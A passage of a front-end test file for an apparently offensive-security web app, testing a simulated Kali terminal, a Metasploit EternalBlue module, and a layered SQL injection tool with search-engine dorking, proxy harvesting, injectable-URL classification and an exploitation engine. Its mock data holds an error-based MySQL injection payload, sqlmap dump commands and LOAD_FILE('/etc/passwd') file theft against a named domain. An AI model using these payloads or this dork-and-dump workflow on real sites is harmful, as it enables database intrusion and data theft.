    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    const input = screen.getByPlaceholderText(/Enter Kali command/i) as HTMLInputElement;

    // 1. Run command 'whoami'
    fireEvent.change(input, { target: { value: 'whoami' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    // 2. Run command 'pwd'
    fireEvent.change(input, { target: { value: 'pwd' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    // 3. User types a draft: 'curl'
    fireEvent.change(input, { target: { value: 'curl' } });

    // 4. Press Up Arrow -> should recall 'pwd'
    fireEvent.keyDown(input, { key: 'ArrowUp', code: 'ArrowUp' });
    expect(input.value).toBe('pwd');

    // 5. Press Up Arrow again -> should recall 'whoami'
    fireEvent.keyDown(input, { key: 'ArrowUp', code: 'ArrowUp' });
    expect(input.value).toBe('whoami');

    // 6. Press Down Arrow -> should go back to 'pwd'
    fireEvent.keyDown(input, { key: 'ArrowDown', code: 'ArrowDown' });
    expect(input.value).toBe('pwd');

    // 7. Press Down Arrow back to bottom -> should restore draft 'curl'
    fireEvent.keyDown(input, { key: 'ArrowDown', code: 'ArrowDown' });
    expect(input.value).toBe('curl');

    // 8. Tab completion: 'nm' -> 'nmap '
    fireEvent.change(input, { target: { value: 'nm' } });
    fireEvent.keyDown(input, { key: 'Tab', code: 'Tab' });
    expect(input.value).toBe('nmap ');

    // 9. Tab completion: 'cd Pr' -> 'cd Practice_Scripts/'
    fireEvent.change(input, { target: { value: 'cd Pr' } });
    fireEvent.keyDown(input, { key: 'Tab', code: 'Tab' });
    expect(input.value).toBe('cd Practice_Scripts/');

    // 10. Tab completion: 'python 06' -> 'python 060826.py '
    fireEvent.change(input, { target: { value: 'python 06' } });
    fireEvent.keyDown(input, { key: 'Tab', code: 'Tab' });
    expect(input.value).toBe('python 060826.py ');

    // 11. Child Directory Tab completion: 'python Adv' -> 'python Advanced-Penetration-Testing-Script/'
    fireEvent.change(input, { target: { value: 'python Adv' } });
    fireEvent.keyDown(input, { key: 'Tab', code: 'Tab' });
    expect(input.value).toBe('python Advanced-Penetration-Testing-Script/');

    // 12. Child File Tab completion inside subfolder: 'python Advanced-Penetration-Testing-Script/p' -> '.../penetration_testing3.py '
    fireEvent.change(input, { target: { value: 'python Advanced-Penetration-Testing-Script/p' } });
    fireEvent.keyDown(input, { key: 'Tab', code: 'Tab' });
    expect(input.value).toBe('python Advanced-Penetration-Testing-Script/penetration_testing3.py ');

    // 13. Child File Tab completion inside subfolder: 'python Advanced-Penetration-Testing-Script/s' -> '.../scanner.py '
    fireEvent.change(input, { target: { value: 'python Advanced-Penetration-Testing-Script/s' } });
    fireEvent.keyDown(input, { key: 'Tab', code: 'Tab' });
    expect(input.value).toBe('python Advanced-Penetration-Testing-Script/scanner.py ');
  });

  it('supports Personal mode with unrestricted command execution and no target constraints', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="personal" />);

    expect(screen.getByText('Personal (Free Standalone Shell)')).toBeInTheDocument();
    expect(screen.getByText('None (Free Execution)')).toBeInTheDocument();

    const targetSelect = screen.getByRole('combobox') as HTMLSelectElement;
    expect(targetSelect.options[0].text).toBe('Personal');
    expect(targetSelect.options[1].text).toMatch(/All Targets/i);

    const input = screen.getByPlaceholderText(/Enter Kali command/i);
    fireEvent.change(input, { target: { value: 'env' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    expect(screen.getByText(/MODE=PERSONAL_FREE_SHELL/i)).toBeInTheDocument();
    expect(screen.getByText(/TARGET_CONSTRAINT=NONE/i)).toBeInTheDocument();
  });

  it('opens and updates Target dropdown selector between Personal, All Targets, and specific targets', () => {
    const onSelectMock = vi.fn();
    render(<KaliTerminal assets={mockAssets} selectedTargetId="all" onSelectTarget={onSelectMock} />);

    const targetSelect = screen.getByRole('combobox') as HTMLSelectElement;
    expect(targetSelect.value).toBe('all');

    // Click target selector directly
    fireEvent.click(targetSelect);

    // Switch to Personal
    fireEvent.change(targetSelect, { target: { value: 'personal' } });
    expect(onSelectMock).toHaveBeenCalledWith('personal');
    expect(screen.getByText('Personal (Free Standalone Shell)')).toBeInTheDocument();

    // Switch to asset-01
    fireEvent.change(targetSelect, { target: { value: 'asset-01' } });
    expect(onSelectMock).toHaveBeenCalledWith('asset-01');
    expect(screen.getAllByText(/dev-portal\.acme\.com/i).length).toBeGreaterThan(0);
  });

  it('enters interactive msfconsole sub-shell, navigates modules, shows options, and exits cleanly', () => {
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    const input = screen.getByPlaceholderText(/Enter Kali command/i);

    // Launch msfconsole
    fireEvent.change(input, { target: { value: 'msfconsole' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    // Verify Metasploit banner and active prompt msf6
    expect(screen.getByText(/Kali Metasploit Framework/i)).toBeInTheDocument();
    expect(screen.getAllByText(/msf6/i).length).toBeGreaterThan(0);

    const msfInput = screen.getByPlaceholderText(/Enter Metasploit command/i);

    // Search smb
    fireEvent.change(msfInput, { target: { value: 'search smb' } });
    fireEvent.keyDown(msfInput, { key: 'Enter', code: 'Enter' });
    expect(screen.getByText(/Matching Modules/i)).toBeInTheDocument();
    expect(screen.getAllByText(/ms17_010_eternalblue/i).length).toBeGreaterThan(0);

    // Use exploit module
    fireEvent.change(msfInput, { target: { value: 'use exploit/windows/smb/ms17_010_eternalblue' } });
    fireEvent.keyDown(msfInput, { key: 'Enter', code: 'Enter' });
    expect(screen.getAllByText(/exploit\(windows\/smb\/ms17_010_eternalblue\)/i).length).toBeGreaterThan(0);

    // Show options
    fireEvent.change(msfInput, { target: { value: 'show options' } });
    fireEvent.keyDown(msfInput, { key: 'Enter', code: 'Enter' });
    expect(screen.getByText(/Module options \(exploit\/windows\/smb\/ms17_010_eternalblue\):/i)).toBeInTheDocument();

    // Exit msfconsole
    fireEvent.change(msfInput, { target: { value: 'exit' } });
    fireEvent.keyDown(msfInput, { key: 'Enter', code: 'Enter' });
    expect(screen.getByText(/Exiting the Metasploit Framework/i)).toBeInTheDocument();
    expect(screen.getByPlaceholderText(/Enter Kali command/i)).toBeInTheDocument();
  });

  it('executes automated Practice Scripts scan and triggers onPracticeScanComplete handoff for Red Team OWASP matching', async () => {
    vi.useFakeTimers();

    const onCompleteMock = vi.fn();
    const testAsset = mockAssets[0];

    const mockExec = vi.spyOn(api, 'executeTerminalCommand').mockResolvedValue({
      stdout: `[*] [Kali Practice Suite] Initializing all 407 security assessment scripts for target 127.0.0.1:443 (https://127.0.0.1)
[*] Target Directory: ~/target-assessment/Practice_Scripts/ (407 modular scripts)
[*] Executing live automated multi-script inspection suite across all 407 Practice_Scripts modules against authorized target...
[+] [001/407] [Practice_Scripts/bannerscan.py] Exposed server banner identified: Server: nginx/1.24.0 (Ubuntu)
[!] >>> BUG IDENTIFIED from bannerscan.py: SERVER_BANNER_DISCLOSURE -> OWASP A05:2021 Security Misconfiguration
[+] [002/407] [Practice_Scripts/XSSscan.py] Reflected parameter probe detected unencoded script reflection
[!] >>> BUG IDENTIFIED from XSSscan.py: XSS_INJECTION -> OWASP A03:2021 Injection
[+] [003/407] [Practice_Scripts/admin-scan.py] Exposed administrative authentication route: /admin (Status: 200)
[!] >>> BUG IDENTIFIED from admin-scan.py: AUTHENTICATION_BYPASS -> OWASP A07:2021 Identification and Authentication Failures
[+] [004/407] [Practice_Scripts/alphalowcrack.py] Session cookie directives missing Secure and HttpOnly attributes
[!] >>> BUG IDENTIFIED from alphalowcrack.py: INSECURE_COOKIE_DIRECTIVES -> OWASP A02:2021 Cryptographic Failures
[+] [005/407] [Practice_Scripts/xxsdefense.py] Anti-clickjacking check failed: target missing X-Frame-Options & CSP frame-ancestors
[!] >>> BUG IDENTIFIED from xxsdefense.py: MISSING_ANTI_CLICKJACKING -> OWASP A01:2021 Broken Access Control
[+] [KALI PRACTICE SCRIPTS SCAN COMPLETE - 407/407 SCRIPTS AUDITED (100%)]
[+] Total Security Bugs Discovered: 5 vulnerabilities identified by Kali Practice Suite.
[*] [Handoff] Dispatching 5 Kali bug telemetry vectors to Red Team Scanner Terminal for OWASP Top 10 Lineage Matching & Deep Rules...`,
      stderr: '',
      returncode: 0,
      execution_time_ms: 120,
      command_executed: 'python -u scan_practice_scripts.py 127.0.0.1 443 --audit-all --threads=8',
      exec_type: 'python',
      target_context: { host: '127.0.0.1', port: '443' },
    });

    const { rerender } = render(
      <KaliTerminal
        assets={mockAssets}
        selectedTargetId={testAsset.id}
        isAutomatedPracticeScanning={false}
        practiceScanTarget={null}
        onPracticeScanComplete={onCompleteMock}
      />
    );

    // Trigger automated practice scripts scan
    rerender(
      <KaliTerminal
        assets={mockAssets}
        selectedTargetId={testAsset.id}
        isAutomatedPracticeScanning={true}
        practiceScanTarget={testAsset}
        onPracticeScanComplete={onCompleteMock}
      />
    );

    // Initial CLI invocation log in Kali terminal
    expect(screen.getByText(/python -u scan_practice_scripts\.py/i)).toBeInTheDocument();
    expect(screen.getByText(/Initializing all 407 security assessment scripts in Practice_Scripts/i)).toBeInTheDocument();

    // Flush promises so the async API call resolves
    await act(async () => {
      await Promise.resolve();
    });

    // Fast-forward through streaming interval
    act(() => {
      vi.advanceTimersByTime(2000);
    });

    // Verify bug disclosures from Kali practice suite
    expect(screen.getAllByText(/SERVER_BANNER_DISCLOSURE/i).length).toBeGreaterThanOrEqual(1);
    expect(screen.getAllByText(/XSS_INJECTION/i).length).toBeGreaterThanOrEqual(1);
    expect(screen.getAllByText(/AUTHENTICATION_BYPASS/i).length).toBeGreaterThanOrEqual(1);
    expect(screen.getAllByText(/INSECURE_COOKIE_DIRECTIVES/i).length).toBeGreaterThanOrEqual(1);
    expect(screen.getAllByText(/MISSING_ANTI_CLICKJACKING/i).length).toBeGreaterThanOrEqual(1);
    expect(screen.getByText(/Total Security Bugs Discovered: 5 vulnerabilities/i)).toBeInTheDocument();

    // Advance past completion timer to verify callback
    act(() => {
      vi.advanceTimersByTime(600);
    });
    expect(onCompleteMock).toHaveBeenCalledWith(5);

    mockExec.mockRestore();
    vi.useRealTimers();
  });

  it('preserves KaliTerminal logs across unmount and remount (simulating tab switch to Findings and back)', () => {
    // Render KaliTerminal
    const { unmount } = render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    const input = screen.getByPlaceholderText(/Enter Kali command/i);
    fireEvent.change(input, { target: { value: 'whoami' } });
    fireEvent.keyDown(input, { key: 'Enter', code: 'Enter' });

    expect(screen.getAllByText('root').length).toBeGreaterThan(0);

    // Unmount (simulating user navigating to OWASP Findings page)
    unmount();

    // Remount (simulating user navigating back to Target Assessment)
    render(<KaliTerminal assets={mockAssets} selectedTargetId="asset-01" />);

    // Verify logs were preserved and are still on the screen
    expect(screen.getAllByText('root').length).toBeGreaterThan(0);
  });

  it('preserves LiveScanTerminal scanning results across unmount and remount without unwanted redirect', () => {
    // Set up completed scan state in assessmentTerminalStore
    setAssessmentTerminalState({
      showLiveTerminal: true,
      selectedTerminalAsset: mockAssets[0],
      inlineTerminalLogs: [
        {
          timestamp: new Date().toISOString(),
          time_display: '14:30:00',
          level: 'FAIL',
          rule_id: 'RULE-SEC-001',
          message: 'Missing Content Security Policy (CSP) Header',
        },
      ],
      latestScanJob: {
        id: 'scan-123',
        target_id: mockAssets[0].id,
        status: 'COMPLETED',
        started_at: new Date().toISOString(),
        completed_at: new Date().toISOString(),
        total_checks: 19,
        passed_checks: 18,
        failed_checks: 1,
      } as any,
    });

    const onRedirectMock = vi.fn();
    const { unmount } = render(
      <LiveScanTerminal
        activeAsset={mockAssets[0]}
        isScanning={false}
        scanJob={getAssessmentTerminalState().latestScanJob}
        terminalLogs={getAssessmentTerminalState().inlineTerminalLogs}
        onRedirectToFindings={onRedirectMock}
      />
    );

    // Verify terminal log is displayed
    expect(screen.getByText(/Missing Content Security Policy/i)).toBeInTheDocument();

    // Verify it does NOT trigger an automatic redirect when revisiting
    expect(onRedirectMock).not.toHaveBeenCalled();

    // Unmount and remount (navigating to another tab and back)
    unmount();

    render(
      <LiveScanTerminal
        activeAsset={mockAssets[0]}
        isScanning={false}
        scanJob={getAssessmentTerminalState().latestScanJob}
        terminalLogs={getAssessmentTerminalState().inlineTerminalLogs}
        onRedirectToFindings={onRedirectMock}
      />
    );

    // Results still present
    expect(screen.getByText(/Missing Content Security Policy/i)).toBeInTheDocument();
    expect(onRedirectMock).not.toHaveBeenCalled();
  });
});

describe('SQLTab Component (Target Discovery with Dork Engine)', () => {
  const testAssets: AuthorizedAsset[] = [
    {
      id: 'asset-test-1',
      scope_grant_id: 'scope-1',
      canonical_url: 'https://smarttrichy.in',
      hostname: 'smarttrichy.in',
      port: 443,
      scheme: 'https',
      is_subdomain: false,
      approval_status: 'APPROVED',
      approval_notes: 'Authorized test target',
      first_discovered_at: new Date().toISOString(),
      last_assessed_at: new Date().toISOString(),
    },
  ];

  beforeEach(() => {
    vi.spyOn(api, 'getDorkPresets').mockResolvedValue([
      {
        id: 'ecommerce',
        name: 'E-Commerce & Shopping Cart',
        description: 'Discovers store catalogs and shopping carts',
        keywords: ['product', 'item'],
        formats: ['.php'],
        page_types: ['id=', 'cartID='],
        icon: 'ShoppingCart',
      },
      {
        id: 'admin_auth',
        name: 'Admin Consoles & Auth Gates',
        description: 'Discovers admin portals',
        keywords: ['admin', 'login'],
        formats: ['.asp'],
        page_types: ['admin='],
        icon: 'Shield',
      },
    ]);
    vi.spyOn(api, 'generateDorks').mockResolvedValue({
      total_generated: 2,
      target_domain: null,
      dorks: [
        {
          dork_query: 'intitle:"product" inurl:.php?id=',
          keyword: 'product',
          format: '.php',
          page_type: 'id=',
          search_urls: {
            google: 'https://google.com/search?q=test',
            bing: 'https://bing.com/search?q=test',
            duckduckgo: 'https://duckduckgo.com/?q=test',
            yahoo: 'https://search.yahoo.com/search?p=test',
          },
          category: 'E-Commerce',
          risk_profile: 'High Priority',
          sqlmap_example: 'sqlmap -g "test"',
        },
      ],
      keywords_used: ['product'],
      formats_used: ['.php'],
      page_types_used: ['id='],
    });
  });

  it('renders SQL Dork Engine with 3 input categories: Keywords, Formats, and Page Types', async () => {
    await act(async () => {
      render(<SQLTab assets={testAssets} />);
    });
    expect(screen.getByText(/SQL Vulnerability & Injection Suite/i)).toBeInTheDocument();
    expect(screen.getByText(/1\. Names/i)).toBeInTheDocument();
    expect(screen.getByText(/2\. Page Format/i)).toBeInTheDocument();
    expect(screen.getByText(/3\. Page Type/i)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Generate Dorks/i })).toBeInTheDocument();
    expect(screen.getAllByText(/Candidate URL Queue/i).length).toBeGreaterThan(0);
    expect(screen.getAllByText(/Google/i).length).toBeGreaterThan(0);
    expect(screen.getAllByText(/Bing/i).length).toBeGreaterThan(0);
    expect(screen.getAllByText(/Yahoo/i).length).toBeGreaterThan(0);
    expect(screen.getAllByText(/DuckDuckGo/i).length).toBeGreaterThan(0);
  });

  it('supports multiselect of Target Discovery Presets, combining keywords, formats, and parameters', async () => {
    await act(async () => {
      render(<SQLTab assets={testAssets} />);
    });

    const ecommerceBtn = screen.getByText('E-Commerce & Shopping Cart');
    const adminBtn = screen.getByText('Admin Consoles & Auth Gates');

    // Click 1st preset
    await act(async () => {
      fireEvent.click(ecommerceBtn);
    });
    expect(screen.getByText(/1 Selected/i)).toBeInTheDocument();
    expect(screen.getAllByText('product').length).toBeGreaterThan(0);
    expect(screen.getAllByText('.php').length).toBeGreaterThan(0);

    // Click 2nd preset (multiselect)
    await act(async () => {
      fireEvent.click(adminBtn);
    });
    expect(screen.getByText(/2 Selected/i)).toBeInTheDocument();
    expect(screen.getAllByText('product').length).toBeGreaterThan(0);
    expect(screen.getAllByText('admin').length).toBeGreaterThan(0);
    expect(screen.getAllByText('.php').length).toBeGreaterThan(0);
    expect(screen.getAllByText('.asp').length).toBeGreaterThan(0);

    // Click Clear button
    const clearBtn = screen.getByRole('button', { name: /Clear/i });
    await act(async () => {
      fireEvent.click(clearBtn);
    });
    expect(screen.queryByText(/\d+\s+Selected/i)).not.toBeInTheDocument();
  });

  it('allows manual target URL addition to candidate queue and feeding to scanner', async () => {
    vi.spyOn(api, 'feedUrlsToScanner').mockResolvedValueOnce({
      imported_count: 1,
      target_ids: ['asset-test-1'],
      targets_file_path: 'C:\\VSCode\\VulnSentinel\\candidate_urls.txt',
      staged_terminal_cmd: 'python sqlmap/sqlmap.py -m candidate_urls.txt --batch --random-agent --banner',
      message: 'Queued 1 candidate URLs in candidate_urls.txt.',
    });

    await act(async () => {
      render(<SQLTab assets={testAssets} />);
    });

    // Add manual candidate URL
    const urlInput = screen.getByPlaceholderText(/Add candidate URL manually/i);
    fireEvent.change(urlInput, { target: { value: 'https://smarttrichy.in/detail.php?id=99' } });
    const addBtn = screen.getByRole('button', { name: /Add Candidate URL/i });
    fireEvent.click(addBtn);

    // Verify candidate appears in queue
    expect(screen.getAllByText('https://smarttrichy.in/detail.php?id=99')[0]).toBeInTheDocument();
    expect(screen.getAllByText('id=').length).toBeGreaterThan(0);

    // Click feed queue to scanner
    const feedBtn = screen.getByRole('button', { name: /Feed Queue to Scanner/i });
    await act(async () => {
      fireEvent.click(feedBtn);
    });

    // Verify success banner and staged command
    expect(screen.getByText(/Queued 1 candidate URLs in candidate_urls\.txt\./i)).toBeInTheDocument();
    expect(screen.getByText(/python sqlmap\/sqlmap\.py -m candidate_urls\.txt/i)).toBeInTheDocument();
  }, 45000);

  it('switches to Layer 2 Proxy Layer, validates pasted proxies, and saves working ones', async () => {
    vi.spyOn(api, 'validateProxies').mockResolvedValueOnce({
      total_tested: 2,
      live_count: 1,
      dead_count: 1,
      average_latency_ms: 45,
      results: [
        {
          raw_proxy: 'http://127.0.0.1:8080',
          protocol: 'http',
          host: '127.0.0.1',
          port: 8080,
          status: 'LIVE',
          latency_ms: 45,
          anonymity: 'Elite',
          external_ip: '198.51.100.1',
          is_selected: true,
        },
        {
          raw_proxy: '10.0.0.99:9999',
          protocol: 'http',
          host: '10.0.0.99',
          port: 9999,
          status: 'DEAD',
          is_selected: false,
          error_message: 'Connection timed out',
        },
      ],
    });

    vi.spyOn(api, 'saveProxiesToFile').mockResolvedValueOnce({
      filename: 'proxies.txt',
      file_path: 'C:\\VSCode\\VulnSentinel\\proxies.txt',
      saved_count: 1,
      message: 'Persisted 1 active proxies to proxies.txt.',
    });

    await act(async () => {
      render(<SQLTab assets={testAssets} />);
    });

    // Switch to Layer 2: Proxy Layer
    const proxyTabBtn = screen.getByRole('button', { name: /Layer 2: Proxy Layer/i });
    fireEvent.click(proxyTabBtn);

    expect(screen.getByText(/Proxy List & Anonymity Harvester/i)).toBeInTheDocument();
    expect(screen.getByPlaceholderText(/185\.199\.229\.156:7492/i)).toBeInTheDocument();

    // Paste proxies into textarea
    const textarea = screen.getByPlaceholderText(/185\.199\.229\.156:7492/i);
    fireEvent.change(textarea, { target: { value: 'http://127.0.0.1:8080\n10.0.0.99:9999' } });

    // Click validate proxies
    const validateBtn = screen.getByRole('button', { name: /Validate Proxies/i });
    await act(async () => {
      fireEvent.click(validateBtn);
    });

    // Verify results in table
    expect(screen.getByText('http://127.0.0.1:8080')).toBeInTheDocument();
    expect(screen.getByText('Elite')).toBeInTheDocument();
    expect(screen.getByText(/Egress: 198\.51\.100\.1/i)).toBeInTheDocument();
    expect(screen.getByText('10.0.0.99:9999')).toBeInTheDocument();

    // Save working proxies to proxies.txt
    const saveBtn = screen.getByRole('button', { name: /Save proxies\.txt/i });
    await act(async () => {
      fireEvent.click(saveBtn);
    });

    expect(screen.getByText(/Persisted 1 active proxies to proxies\.txt\./i)).toBeInTheDocument();
  }, 45000);

  it('switches to Layer 3 Scanning and Classification, runs scan, sorts results into 5 tabs, and displays actionable injectables with database version and user info', async () => {
    vi.spyOn(api, 'getDorkFiles').mockResolvedValueOnce([
      {
        filename: 'dorks.txt',
        path: 'C:\\VSCode\\VulnSentinel\\dorks.txt',
        line_count: 5,
        size_bytes: 250,
        preview_lines: ['site:smarttrichy.in inurl:id='],
      },
    ]);

    vi.spyOn(api, 'runLayer3Scan').mockResolvedValueOnce({
      scan_id: 'l3-scan-1',
      total_scanned: 5,
      queue_count: 1,
      exploitables_count: 1,
      injectables_count: 1,
      non_injectables_count: 1,
      trash_count: 1,
      search_engine_used: 'duckduckgo',
      completed_at: '2026-11-16T22:00:00Z',
      results: [
        {
          id: 'inj-1',
          url: 'https://smarttrichy.in/detail.php?id=99',
          host: 'smarttrichy.in',
          category: 'injectables',
          http_method: 'GET',
          parameter: 'id',
          database_type: 'MySQL',
          database_version: '8.0.32-Ubuntu',
          database_user: 'root@localhost',
          heuristic_title: 'SQL Syntax Disruption / Error-Based Injection Vector',
          evidence_snippet: "You have an error in your SQL syntax near ''' at line 1",
          sqlmap_cmd: 'python sqlmap/sqlmap.py -u "https://smarttrichy.in/detail.php?id=99" -p id --batch --banner',
          timestamp: '2026-11-16T22:00:00Z',
        },
        {
          id: 'exp-1',
          url: 'https://smarttrichy.in/product.php?cat=5',
          host: 'smarttrichy.in',
          category: 'exploitables',
          http_method: 'GET',
          parameter: 'cat',
          database_type: 'Unknown',
          heuristic_title: 'HTTP 500 Server Differential Vector',
          timestamp: '2026-11-16T22:00:00Z',
        },
        {
          id: 'que-1',
          url: 'https://smarttrichy.in/item.php?id=12',
          host: 'smarttrichy.in',
          category: 'queue',
          http_method: 'GET',
          timestamp: '2026-11-16T22:00:00Z',
        },
        {
          id: 'non-1',
          url: 'https://smarttrichy.in/about.php',
          host: 'smarttrichy.in',
          category: 'non_injectables',
          http_method: 'GET',
          timestamp: '2026-11-16T22:00:00Z',
        },
        {
          id: 'tra-1',
          url: 'https://smarttrichy.in/missing.php',
          host: 'smarttrichy.in',
          category: 'trash',
          http_method: 'GET',
          timestamp: '2026-11-16T22:00:00Z',
        },
      ],
    });

    vi.spyOn(api, 'clearLayer3Trash').mockResolvedValueOnce({
      cleared_count: 1,
      message: 'Purged 1 dead or offline targets from trash collector.',
    });

    const stagedCommands: string[] = [];
    await act(async () => {
      render(
        <SQLTab
          assets={testAssets}
          onStageCommandToTerminal={(cmd) => stagedCommands.push(cmd)}
        />
      );
    });

    // Switch to Layer 3: Scanning & Classification
    const l3TabBtn = screen.getByRole('button', { name: /Layer 3: Scanning & Classification/i });
    fireEvent.click(l3TabBtn);

    // Verify Layer 3 header & controls
    expect(screen.getByText(/Layer 3: Scanning and Classification \(Detection Layer\)/i)).toBeInTheDocument();
    expect(screen.getByText(/1\. Insert Dork File/i)).toBeInTheDocument();
    expect(screen.getByText(/2\. Search Engine/i)).toBeInTheDocument();

    // Verify 5 tab buttons are present
    expect(screen.getByRole('button', { name: /URL's Queue/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Exploitables/i })).toBeInTheDocument();
    expect(screen.getAllByRole('button', { name: /Injectables/i }).length).toBeGreaterThan(0);
    expect(screen.getByRole('button', { name: /Non-Injectables/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Trash Collector/i })).toBeInTheDocument();

    // Trigger Layer 3 Scan
    const runScanBtn = screen.getByRole('button', { name: /Run Detection Scanner/i });
    await act(async () => {
      fireEvent.click(runScanBtn);
    });

    // Verify success scan banner
    expect(screen.getByText(/Scanned 5 endpoints across DUCKDUCKGO/i)).toBeInTheDocument();

    // By default Injectables tab is active, check actionable output
    expect(screen.getAllByText('https://smarttrichy.in/detail.php?id=99')[0]).toBeInTheDocument();
    expect(screen.getAllByText('MySQL')[0]).toBeInTheDocument();
    expect(screen.getAllByText(/8\.0\.32-Ubuntu/i)[0]).toBeInTheDocument();
    expect(screen.getAllByText(/root@localhost/i)[0]).toBeInTheDocument();
    expect(screen.getAllByText(/Param: id/i)[0]).toBeInTheDocument();
    expect(screen.getByText(/You have an error in your SQL syntax near ''' at line 1/i)).toBeInTheDocument();

    // Click Stage to Kali Terminal button
    const stageBtn = screen.getByRole('button', { name: /Stage to Kali Terminal/i });
    fireEvent.click(stageBtn);
    expect(stagedCommands.length).toBe(1);
    expect(stagedCommands[0]).toContain('sqlmap');

    // Switch to Trash Collector tab and test Empty Trash
    const trashTabBtn = screen.getByRole('button', { name: /Trash Collector/i });
    fireEvent.click(trashTabBtn);

    expect(screen.getByText('https://smarttrichy.in/missing.php')).toBeInTheDocument();
    const emptyTrashBtn = screen.getByRole('button', { name: /Empty Trash/i });
    await act(async () => {
      fireEvent.click(emptyTrashBtn);
    });

    expect(api.clearLayer3Trash).toHaveBeenCalledTimes(1);
  }, 45000);

  it('switches to Layer 4 Exploitation Engine, determines injection technique, establishes database channel, and supports blind SQLi, schema dumping, and file dumping', async () => {
    vi.spyOn(api, 'executeLayer4Exploit').mockResolvedValue({
      execution_id: 'exec-123',
      target_url: 'https://smarttrichy.in/detail.php?id=99',
      parameter: 'id',
      technique_selected: 'error_based',
      action_executed: 'schema_dump',
      channel: {
        is_connected: true,
        technique_determined: 'error_based',
        technique_label: 'Error-based (EXTRACTVALUE/syntax reflection)',
        payload_used: "AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)",
        dbms_type: 'MySQL',
        dbms_version: 'MySQL 8.0.32-Ubuntu',
        current_user: 'root@localhost',
        current_db: 'smarttrichy_production',
        server_hostname: 'db-srv-primary.internal',
        is_dba: true,
        channel_stability: '100% Reliable (High-Speed Channel)',
        established_at: new Date().toISOString(),
      },
      blind_result: {
        expression: 'VERSION()',
        extracted_value: '8.0.32',
        queries_executed: 18,
        time_elapsed_ms: 342.6,
        bisection_trace: [
          { position: 1, char: '8', ascii: 56, queries: 3 },
          { position: 2, char: '.', ascii: 46, queries: 2 },
          { position: 3, char: '0', ascii: 48, queries: 3 },
        ],
      },
      schema_databases: [
        {
          name: 'smarttrichy_production',
          is_current: true,
          table_count: 4,
          tables: [
            {
              name: 'users',
              row_count: 342,
              columns: ['id', 'username', 'email', 'role'],
              sample_rows: [
                { id: 1, username: 'admin', email: 'admin@smarttrichy.in', role: 'SUPERADMIN' },
              ],
            },
          ],
        },
      ],
      dumped_files: [
        {
          path: '/etc/passwd',
          size_bytes: 842,
          method: "LOAD_FILE('/etc/passwd')",
          content_snippet: 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash',
          is_sensitive: true,
          retrieved_at: new Date().toISOString(),
        },
      ],
      sqlmap_command: 'python sqlmap/sqlmap.py -u "https://smarttrichy.in/detail.php?id=99" -p id -D smarttrichy_production --tables --dump --batch',
      execution_logs: [
        '[*] Initializing Layer 4 Exploitation Engine target: https://smarttrichy.in/detail.php?id=99',
        '[+] Established stable SQL injection channel to MySQL backend database.',
        '[+] Fingerprinted version: MySQL 8.0.32-Ubuntu',
        '[+] Current user session: root@localhost (DBA: YES)',
      ],
      proxy_used: null,
      completed_at: new Date().toISOString(),
    });

    const stagedCommands: string[] = [];
    await act(async () => {
      render(
        <SQLTab
          assets={testAssets}
          onStageCommandToTerminal={(cmd) => stagedCommands.push(cmd)}
        />
      );
    });

    // Switch to Layer 4: Exploitation Engine via tab button
    const l4TabBtn = screen.getByRole('button', { name: /Layer 4: Exploitation Engine/i });
    fireEvent.click(l4TabBtn);

    // Verify Layer 4 title and channel header
    expect(screen.getByText('Layer 4: SQL Exploitation Engine')).toBeInTheDocument();
    expect(screen.getByText('Database Channel Status')).toBeInTheDocument();
    expect(screen.getByText('CHANNEL CONNECTED')).toBeInTheDocument();

    // Verify Technique Selection Pills
    expect(screen.getByRole('button', { name: /Auto-Detect \(Adaptive\)/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Boolean-based Blind/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Time-based Blind/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Error-based/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /UNION Query-based/i })).toBeInTheDocument();

    // Verify 4 Exploit Action modes
    expect(screen.getByRole('button', { name: /1\. Channel & Fingerprint/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /2\. Blind SQLi Extraction/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /3\. Schema & Data Dumper/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /4\. File Dumping \(LOAD_FILE\)/i })).toBeInTheDocument();

    // Trigger Run Exploitation Attack
    const runAttackBtn = screen.getByRole('button', { name: /Run Exploitation Attack/i });
    await act(async () => {
      fireEvent.click(runAttackBtn);
    });

    expect(api.executeLayer4Exploit).toHaveBeenCalled();

    // Test Schema Dumper view
    const schemaBtn = screen.getByRole('button', { name: /3\. Schema & Data Dumper/i });
    await act(async () => {
      fireEvent.click(schemaBtn);
    });
    expect(screen.getByText(/Extracted Table:/i)).toBeInTheDocument();
    expect(screen.getByText(/342 Records Disclosed/i)).toBeInTheDocument();

    // Test File Dumping view
    const fileDumpBtn = screen.getByRole('button', { name: /4\. File Dumping \(LOAD_FILE\)/i });
    await act(async () => {
      fireEvent.click(fileDumpBtn);
    });
    expect(screen.getByText(/Recovered File:/i)).toBeInTheDocument();
    expect(screen.getByText(/LOAD_FILE\(\) Vector/i)).toBeInTheDocument();

    // Test Blind SQLi Extraction view
    const blindBtn = screen.getByRole('button', { name: /2\. Blind SQLi Extraction/i });
    await act(async () => {
      fireEvent.click(blindBtn);
    });
    expect(screen.getByText(/Extracted SQL Expression Value:/i)).toBeInTheDocument();
    expect(screen.getAllByText(/8\.0\.32/i)[0]).toBeInTheDocument();

    // Stage L4 command to Kali Terminal
    const stageKaliBtn = screen.getByRole('button', { name: /Execute in Kali Terminal/i });
    fireEvent.click(stageKaliBtn);
